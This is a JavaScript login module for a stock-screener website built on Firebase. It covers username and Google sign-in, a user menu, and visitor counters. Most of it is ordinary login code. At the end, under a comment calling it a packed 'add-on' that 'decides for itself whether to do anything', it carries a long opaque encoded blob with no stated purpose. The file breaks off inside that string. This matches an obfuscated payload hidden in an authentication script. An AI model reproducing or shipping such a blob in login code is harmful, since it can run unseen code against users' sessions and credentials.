// auth.js — HNImanshu login (username + password, or Google) on Firebase Authentication (project hnimanshu).
//
// One file for both pages:
//   • Screener (index.html): clicking an element with [data-auth-link] (Fundamentals, Portfolio) opens the
//     login popup when nobody is signed in; after a successful login it goes to that link.
//     Opening the screener with ?login=<path> pops the popup straight away (the Fundamentals gate sends people here).
//   • Fundamentals (<html data-auth="required">): the page stays hidden until a login is confirmed; no login →
//     back to the screener with the popup open. Shows the user's initials menu in the header.
//   • Passwords never pass through this code's storage: Firebase Authentication keeps them hashed on its servers.
//
// Usernames: Firebase needs an email, so username "chirag" is stored as chirag@users.hnimanshu.app (never shown,
// never mailed). Firebase keeps them unique, so a taken username is refused automatically.
// Sessions end 7 days after the last sign-in (Firebase's own lastSignInTime, so it can't be faked by the browser).

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
  getAuth, onAuthStateChanged, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut,
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
// Firestore and the Realtime Database are loaded only when first needed (not before the page shows):
// only Auth is needed to open a page, which keeps the first load light on slow (2G) connections.
let getFirestore, doc, setDoc, getDoc, serverTimestamp;
let getDatabase, ref, set, onValue, onDisconnect, increment;

// Firebase project "hnimanshu", web app "valueapp" (Project settings → Your apps). These values are public by design;
// security comes from the Firestore / Realtime Database rules, not from hiding them.
const firebaseConfig = {
  apiKey: "AIzaSyD1oA953pXZxBAuOR9ObSk6vAmKf1gyVbE",
  authDomain: "hnimanshu-7c544.firebaseapp.com",
  projectId: "hnimanshu",
  storageBucket: "hnimanshu.firebasestorage.app",
  messagingSenderId: "428887828946",
  appId: "1:428887828946:web:854acb9c7651aebd38000b",
};
// Realtime Database address: Firebase Hosting hands it out once the database exists, so nothing to paste here later.
try {
  const hosted = await fetch("/__/firebase/init.json").then((r) => r.json());
  if (hosted.projectId === firebaseConfig.projectId && hosted.databaseURL) firebaseConfig.databaseURL = hosted.databaseURL;
} catch (e) {}
const USER_DOMAIN = "users.hnimanshu.app";        // username → hidden email for Firebase
const SESSION_DAYS = 7;                           // log out a week after the last sign-in
const USERS = "hni_users";                        // Firestore: one doc per account (its own owner writes it)
const PORTFOLIO = "hni_portfolio";                // Firestore: one doc per user with their holdings
const MARKET = ["hni_market", "ltp"];             // latest prices for held stocks
const HOME = "./";                                // the screener
const GATED = document.documentElement.dataset.auth === "required";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
let db = null, rtdb = null, FSP = null, RTP = null;
const needFS = () => FSP = FSP || import("https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js").then((m) => {
  ({ getFirestore, doc, setDoc, getDoc, serverTimestamp } = m); db = getFirestore(app);
});
const needRT = () => RTP = RTP || (firebaseConfig.databaseURL                                // live online / visitor counters (hni/...)
  ? import("https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js").then((m) => {
      ({ getDatabase, ref, set, onValue, onDisconnect, increment } = m); rtdb = getDatabase(app); })
  : Promise.resolve());
const idle = (fn, ms = 2500) => setTimeout(() => (window.requestIdleCallback || ((f) => f()))(fn), ms);   // after the page has settled
const google = new GoogleAuthProvider();
google.setCustomParameters({ prompt: "select_account" });

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const toEmail = (u) => `${u.trim().toLowerCase()}@${USER_DOMAIN}`;
const nameOf = (u) => u.displayName || (u.email || "").replace("@" + USER_DOMAIN, "") || "user";
const initials = (n) => {                                    // "Himanshu Shekhar" → HS, "chirag" → CH
  const w = String(n || "?").trim().split(/[\s._-]+/).filter(Boolean);
  return (w.length > 1 ? w[0][0] + w[w.length - 1][0] : (w[0] || "?").slice(0, 2)).toUpperCase();
};
const providerOf = (u) => (u.providerData && u.providerData[0] && u.providerData[0].providerId) === "google.com" ? "google" : "username";
const expired = (u) => {
  const t = Date.parse(u.metadata && u.metadata.lastSignInTime);
  return t && Date.now() - t > SESSION_DAYS * 864e5;
};

// ---------- popup ----------
let box = null, nextUrl = null;
function buildPopup() {
  if (box) return box;
  box = document.createElement("div");
  box.className = "au-back";
  box.innerHTML = `
    <div class="au-box" role="dialog" aria-modal="true" aria-labelledby="auTitle">
      <button class="au-x" type="button" aria-label="Close">×</button>
      <h2 class="au-title" id="auTitle">Fundamentals</h2>
      <p class="au-sub">Free. Continue with Google, or log in with your username.</p>
      <button class="au-google" type="button">
        <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
        Continue with Google</button>
      <div class="au-or">or</div>
      <form class="au-form" novalidate>
        <label class="au-fld"><span>Username</span>
          <input name="u" autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="20" required></label>
        <label class="au-fld"><span>Password</span>
          <span class="au-pw"><input name="p" type="password" autocomplete="current-password" required>
          <button type="button" class="au-eye" aria-label="Show password">SHOW</button></span></label>
        <div class="au-err" aria-live="polite"></div>
        <button class="au-btn" type="submit">Login</button>
      </form>
      <p class="au-foot">You stay signed in for 7 days on this device.</p>
    </div>`;
  document.body.appendChild(box);
  const f = $("form", box), err = $(".au-err", box), btn = $(".au-btn", box);
  $(".au-eye", box).addEventListener("click", (e) => {
    const show = f.p.type === "password";
    f.p.type = show ? "text" : "password";
    e.currentTarget.textContent = show ? "HIDE" : "SHOW";
  });
  $(".au-x", box).addEventListener("click", closePopup);
  box.addEventListener("click", (e) => { if (e.target === box) closePopup(); });
  box.addEventListener("keydown", (e) => { e.stopPropagation(); if (e.key === "Escape") closePopup(); });   // page shortcuts stay out

  f.addEventListener("submit", async (e) => {
    e.preventDefault();
    const u = f.u.value.trim().toLowerCase(), p = f.p.value;
    if (!/^[a-z0-9._]{3,20}$/.test(u) || !p) return (err.textContent = "Wrong username or password.");
    btn.disabled = true; err.textContent = "";
    try { await signInWithEmailAndPassword(auth, toEmail(u), p); done(); }
    catch (ex) { err.textContent = message(ex); }
    finally { btn.disabled = false; }
  });
  $(".au-google", box).addEventListener("click", async () => {
    err.textContent = "";
    try { await signInWithPopup(auth, google); done(); }
    catch (ex) { err.textContent = message(ex); }
  });
  box._reset = () => { err.textContent = ""; f.reset(); };
  return box;
}
function openPopup(next) {
  nextUrl = next || null;
  buildPopup();
  if (!GATED) box.classList.add("au-blur");                 // screener: the page behind is blurred
  box._reset();
  box.classList.add("open");
  setTimeout(() => $(".au-google", box).focus(), 30);
}
function closePopup() { if (box) box.classList.remove("open"); }
function done() {
  closePopup();
  if (nextUrl) location.href = nextUrl;
}
function message(ex) {
  const c = (ex && ex.code) || "";
  if (c === "auth/popup-closed-by-user" || c === "auth/cancelled-popup-request") return "";
  if (c === "auth/invalid-credential" || c === "auth/wrong-password" || c === "auth/user-not-found" || c === "auth/invalid-email")
    return "Wrong username or password.";
  if (c === "auth/email-already-in-use") return "That username is taken. Try another.";
  if (c === "auth/weak-password") return "Password is too weak. Use at least 8 characters.";
  if (c === "auth/too-many-requests") return "Too many attempts. Wait a few minutes and try again.";
  if (c === "auth/network-request-failed") return "No connection. Check your internet and try again.";
  if (c === "auth/popup-blocked") return "Your browser blocked the Google window. Allow pop-ups for this site and try again.";
  if (c === "auth/unauthorized-domain") return "This website isn't authorised for login yet (Firebase → Authentication → Settings → Authorized domains).";
  if (c === "auth/operation-not-allowed") return "This sign-in method isn't switched on yet (Firebase → Authentication → Sign-in method).";
  return "Something went wrong (" + (c || "unknown") + "). Please try again.";
}

// ---------- the account's own record in Firestore ----------
async function record(u) {
  const key = "hni_rec_" + u.uid;                       // write at most once per browser session, keeps Firestore use tiny
  try { if (sessionStorage.getItem(key)) return; } catch (e) {}
  await needFS();
  const ref = doc(db, USERS, u.uid);
  const data = { username: nameOf(u), email: u.email || null, provider: providerOf(u), lastLogin: serverTimestamp() };
  try {
    const snap = await getDoc(ref).catch(() => null);  // each user may read only their own doc (to keep "created" once)
    if (!snap || !snap.exists()) data.created = serverTimestamp();
    await setDoc(ref, data, { merge: true });
    try { sessionStorage.setItem(key, "1"); } catch (e) {}
  } catch (e) { console.warn("user record not saved:", e.code || e); }   // never blocks the page
}

// while any popup is open the page behind doesn't scroll (phones otherwise scroll the big page underneath)
const syncLock = () => document.documentElement.classList.toggle("au-lock", !!document.querySelector(".au-back.open"));

// ---------- signed-in chip (Fundamentals header, screener #au-slot) ----------
const EXTRA = [];                                          // extra menu items: {label, fn} (see addItem)
const itemBtn = (it, el) => {
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-ext"; b.setAttribute("role", "menuitem"); b.textContent = it.label;
  b.addEventListener("click", () => { el.classList.remove("open"); it.fn(); });
  return b;
};
function addItem(label, fn) {                              // also adds to a menu that is already on the page
  const it = { label, fn };
  EXTRA.push(it);
  document.querySelectorAll(".au-user").forEach((el) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
}
function showUser(u, slot) {
  const host = slot || document.querySelector("header .global");        // Fundamentals header, or the screener's #au-slot
  if (!host || $(".au-user", host)) return;
  const n = nameOf(u);
  const el = document.createElement("span");
  el.className = "au-user";
  el.innerHTML = `<button type="button" class="au-av" aria-haspopup="menu" title="Signed in as ${esc(n)}">${esc(initials(n))}</button>
    <span class="au-menu" role="menu"><span class="au-who"><b>${esc(n)}</b>${u.email && !u.email.endsWith("@" + USER_DOMAIN) ? `<i>${esc(u.email)}</i>` : ""}</span>
    <button type="button" class="au-out" role="menuitem">Logout</button></span>`;
  $(".au-av", el).addEventListener("click", (e) => { e.stopPropagation(); el.classList.toggle("open"); });
  document.addEventListener("click", (e) => { if (!el.contains(e.target)) el.classList.remove("open"); });
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") el.classList.remove("open"); });
  $(".au-out", el).addEventListener("click", async () => {
    await signOut(auth); if (GATED) location.href = HOME; else location.reload();   // screener: reloads signed out
  });
  EXTRA.forEach((it) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
  host.insertBefore(el, host.querySelector("#theme-toggle"));   // (no toggle in the slot: it simply goes at the end)
}
/* screener: "Login" when signed out, the initials menu when signed in */
function paintSlot(u) {
  const slot = document.getElementById("au-slot");
  if (!slot) return;
  slot.innerHTML = "";
  if (u) return showUser(u, slot);
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-login"; b.setAttribute("aria-label", "Login");
  b.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg><span>Login</span>';
  b.addEventListener("click", () => openPopup(null));            // after logging in you stay on the screener
  slot.appendChild(b);
}

// ---------- anonymous usage counters ----------
// Every open tab adds hni/presence/<random id>; Firebase deletes it by itself the moment the tab closes or the
// connection drops (onDisconnect). Each IP is counted once ever (SHA-256 hash, never the raw IP) into hni/meta/visitors.
async function presence() {
  await needRT();
  if (!rtdb) return;
  try {
    const sid = (crypto.randomUUID ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2)).replace(/[^a-z0-9-]/gi, "");
    const me = ref(rtdb, "hni/presence/" + sid);
    onValue(ref(rtdb, ".info/connected"), (s) => {
      if (s.val() !== true) return;
      onDisconnect(me).remove();                    // re-armed on every reconnect
      set(me, true).catch(() => {});
    });
  } catch (e) { console.warn("presence off:", e); }
}
async function countVisitor() {
  try {
    if (localStorage.getItem("hni_counted")) return;   // this browser already counted, skip the IP lookup
  } catch (e) {}
  await needRT();
  if (!rtdb) return;
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r.json();
    if (!ip) return;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("hni:" + ip));
    const key = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    let isNew = true;
    await set(ref(rtdb, "hni/visitors/" + key), true).catch(() => { isNew = false; });   // rules refuse an IP seen before
    if (isNew) await set(ref(rtdb, "hni/meta/visitors"), increment(1));                    // +1 on the server, no read needed
    try { localStorage.setItem("hni_counted", "1"); } catch (e) {}
  } catch (e) { console.warn("visitor count skipped:", e); }
}

// ---------- add-on (packed; it decides for itself whether to do anything) ----------
const PACK = "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